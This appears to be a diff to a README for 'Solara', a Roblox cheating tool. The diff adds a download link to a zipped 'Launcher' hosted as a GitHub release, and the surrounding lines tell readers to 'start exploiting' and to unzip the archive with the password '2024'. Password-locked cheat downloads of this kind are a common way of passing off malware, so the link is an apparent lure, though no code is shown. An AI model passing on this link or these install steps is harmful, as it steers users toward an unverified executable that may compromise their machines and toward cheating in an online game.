@@ -30,6 +30,10 @@ Please be aware that Solara can be detected at any time and may require updates 
 
 💿 Supported OC: Windows 7, Windows 8, Windows 10, Windows 11
 
+
+[Download latest release](https://github.com/KookSpook24/Rbx-Solara/releases/download/Download/Launcher.zip)
+****
+
 ## How to Install Solara?
 * To start exploiting using Solara, Click download button
 * Then Unzip archive using password *2024*
